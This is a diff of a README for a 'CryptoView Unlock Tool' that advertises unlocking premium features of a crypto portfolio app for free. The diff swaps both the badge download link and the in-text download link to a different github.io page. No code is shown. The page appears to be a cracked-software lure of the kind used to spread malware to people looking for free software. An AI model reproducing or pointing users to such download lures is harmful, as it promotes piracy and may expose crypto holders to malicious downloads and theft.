@@ -6,7 +6,7 @@
 <h1 align="center">⚡ CryptoView Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://cryptoview-free-download.github.io/CryptoView-Free-Download/" target="_blank">
+  <a href="https://cryptoview-free-download.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20CryptoView%20Free%20for%20Windows-Enable%20Premium%20Features-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
          alt="Download CryptoView Free for Windows" style="width: 540px; height: 37px;">
   </a>
@@ -97,7 +97,7 @@ Report bugs or contribute via Issues or Pull Requests.
 ## ⭐ Unlock CryptoView – Crypto Portfolio Management
 
 Unlock premium features of **CryptoView**, including **multi-exchange portfolio management, real-time price alerts, professional charts, and automated trading tools**.  
-[Download the Unlock Tool](https://cryptoview-free-download.github.io/CryptoView-Free-Download/) and manage your crypto portfolio smarter.  
+[Download the Unlock Tool](https://cryptoview-free-download.github.io/.github/) and manage your crypto portfolio smarter.  
 
 ---
 
